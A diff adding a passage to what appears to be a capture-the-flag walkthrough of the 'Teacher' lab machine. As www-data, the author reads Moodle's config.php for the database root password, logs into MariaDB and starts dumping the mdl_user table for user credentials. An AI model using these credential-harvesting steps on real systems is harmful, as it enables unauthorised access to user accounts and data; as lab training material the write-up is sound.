@@ -245,6 +245,103 @@
     www-data@teacher:/home$ cd giovanni
     bash: cd: giovanni: Permission denied
 
-// 
+// Searching around the '/moodle' directory reavels us with 'config.php' file
+
+    www-data@teacher:/var/www/html/moodle$ ls -al  
+
+    ...
+    -rw-r--r--  1 root root    728 Nov  3  2018 config.php
+    ...
+
+// Lets see the content
+
+    www-data@teacher:/var/www/html/moodle$ cat config.php
+
+    <?php  // Moodle configuration file
+
+    unset($CFG);
+    global $CFG;
+    $CFG = new stdClass();
+
+    $CFG->dbtype    = 'mariadb';
+    $CFG->dblibrary = 'native';
+    $CFG->dbhost    = 'localhost';
+    $CFG->dbname    = 'moodle';
+    $CFG->dbuser    = 'root';
+    $CFG->dbpass    = 'Welkom1!';
+    $CFG->prefix    = 'mdl_';
+    ...
+
+// Great !, We got database credentials !
+
+    root : Welkom1!
+
+// We can check the services running with command 'pstree', to see which database this host using
+
+    www-data@teacher:/var/www/html/moodle$ pstree | head -n 10
+
+    systemd-+-VGAuthService
+            |-agetty
+            |-apache2-+-9*[apache2]
+            |         `-apache2---sh---bash---python---bash-+-head
+            |                                               `-pstree
+            |-cron
+            |-dbus-daemon
+            |-mysqld---28*[{mysqld}]
+            |-rsyslogd-+-{in:imklog}
+            |          |-{in:imuxsock}
 
 
+// We can connect to mysql database with 'mysql' command
+
+    www-data@teacher:/var/www/html/moodle$ mysql -h 127.0.0.1 -u root -p
+    Enter password: Welkom1!
+
+    Welcome to the MariaDB monitor.  Commands end with ; or \g.
+    Your MariaDB connection id is 614
+    Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1
+
+    Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.
+
+    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+    MariaDB [(none)]> 
+
+// Corrently we not in any database (none), Lets check the exist databases with 'SHOW DATABASES;'
+
+    MariaDB [(none)]> SHOW DATABASES;
+    SHOW DATABASES;
+    +--------------------+
+    | Database           |
+    +--------------------+
+    | information_schema |
+    | moodle             |
+    | mysql              |
+    | performance_schema |
+    | phpmyadmin         |
+    +--------------------+
+    5 rows in set (0.00 sec)
+
+// The most chances to have credentials its to phpmyadmin amd moodle DATABASES
+
+// Searching in phpmyadmin didnt gave much, So i continued to moodle database
+
+// Checking the tables in moodle database
+
+// Shows us a lot of tables, but the most interesting one its 'mdl_user'
+
+    MariaDB [moodle]> SHOW TABLES;
+    SHOW TABLES;
+    +----------------------------------+
+    | Tables_in_moodle                 |
+    +----------------------------------+
+    | mdl_analytics_indicator_calc     |
+    ...
+    | mdl_user                         |
+    ...
+    | mdl_workshopform_rubric_levels   |
+    +----------------------------------+
+
+// Lets see 'mdl_user' table contant
+
+SELECT * from mdl_user;
